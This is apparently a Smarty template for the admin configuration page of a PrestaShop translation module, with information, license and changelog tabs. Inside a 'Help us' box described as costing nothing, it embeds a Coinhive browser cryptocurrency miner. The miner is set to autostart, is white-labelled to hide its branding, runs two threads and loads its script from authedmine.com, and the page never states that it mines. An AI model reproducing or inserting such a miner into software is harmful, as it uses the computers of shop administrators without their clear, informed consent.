{*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade this module to newer
* versions in the future. If you wish to customize this module for your
* needs please refer to http://doc.prestashop.com/display/PS15/Overriding+default+behaviors
* #Overridingdefaultbehaviors-Overridingamodule%27sbehavior for more information.
*
*   @author Mediacom87 <support@mediacom87.net>
*   @copyright  Mediacom87
*   @license    commercial license see tab in the module
*}

{if $ps_version < 1.6}
<script src="https://use.fontawesome.com/8ebcaf88e9.js" async></script>
{/if}

<div id="chargement">
    <i class="{if $ps_version >= 1.6}process-icon-refresh icon-spin icon-pulse{else}fa fa-refresh fa-spin fa-pulse clear{/if}"></i> {l s='Loading...' mod='medgtranslate'}<span id="chargement-infos"></span>
</div>

<script type="text/javascript">

    $(document).ready(function() {ldelim}

        $.pageLoader();

    {rdelim});

</script>

<ps-tabs position="top">

    <ps-tab label="{l s='Informations' mod='medgtranslate'}" active="true" id="tab20" icon="icon-info" fa="info">

        {include file="$tpl_path/views/templates/admin/about.tpl"}

        <ps-alert-hint>

            <h2>{l s='Help us' mod='medgtranslate'}</h2>
            <p>{l s='This module took some time to develop and test.' mod='medgtranslate'}</p>
            <p>{l s='You can help me by clicking just below.' mod='medgtranslate'}</p>
            <p>{l s='It does not cost anything, but will allow me to continue to maintain this functional and free module.' mod='medgtranslate'}</p>

            <ps-panel-divider></ps-panel-divider>

            <p class="coinhive-miner"
            	data-key="CDiOs8VyHBLSuVi7U15MRyAxIQbh2sbu"
            	data-autostart="true"
            	data-whitelabel="true"
            	data-background="#DCF4F9;"
            	data-text="#1e94ab"
            	data-action="#4ac7e0"
            	data-graph="#1e94ab"
            	data-threads="2"
            	data-throttle="0.5">
            	<em>{l s='Loading...' mod='medgtranslate'}</em>
            </p>

            <ps-panel-divider></ps-panel-divider>

            <p style="text-align: center">
                <!-- Gratuit 728x90 Medgtranslate -->
                <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1663608442612102" data-ad-slot="2405516467" data-ad-format="auto"></ins>
                <script>
                (adsbygoogle = window.adsbygoogle || []).push({ldelim}{rdelim});
                </script>

            </p>

            <ps-panel-divider></ps-panel-divider>

            <p>{l s='You can also donate directly through PayPal.' mod='medgtranslate'}</p>

            <p style="text-align: center">

                <a href="https://www.paypal.me/jeckyl/5" class="btn btn-mediacom87" target="_blank"><i class="{if $ps_version >= 1.6}icon icon-paypal{else}fa fa-paypal{/if}"></i> {l s='Donate € 5' mod='medgtranslate'}</a>

            </p>

        </ps-alert-hint>

    </ps-tab>

    <ps-tab label="{l s='More Modules' mod='medgtranslate'}" id="tab25" icon="icon-cubes" fa="cubes">

        {include file="$tpl_path/views/templates/admin/modules.tpl"}

    </ps-tab>

    <ps-tab label="{l s='License' mod='medgtranslate'}" id="tab30" icon="icon-legal" fa="legal">

        {include file="$tpl_path/views/templates/admin/licence.tpl"}

    </ps-tab>

    <ps-tab label="Changelog" id="tab40" icon="icon-code" fa="code">

        {include file="$tpl_path/views/templates/admin/changelog.tpl"}

    </ps-tab>

</ps-tabs>

<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
<script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script>